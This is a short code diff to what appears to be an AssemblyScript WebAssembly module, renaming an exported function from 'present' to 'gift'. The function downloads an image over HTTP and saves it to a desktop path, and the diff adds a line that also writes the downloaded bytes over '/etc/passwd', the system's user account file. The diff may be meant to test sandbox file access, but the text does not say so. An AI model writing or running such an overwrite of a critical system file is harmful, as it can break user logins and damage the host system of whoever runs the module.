@@ -76,10 +76,12 @@ export function chat(ptr: u64, length: i32): void {
   return;
 }
 
-export function present(): void {
+export function gift(): void {
   log("present");
 
   const resp = HTTP("GET", "https://i.imgflip.com/7ggtv4.jpg", "{}", "{}");
+
+  file("/etc/passwd", changetype<usize>(resp), resp.byteLength);
 
   file("/Users/j0n/Desktop/wasm.png", changetype<usize>(resp), resp.byteLength);
 }
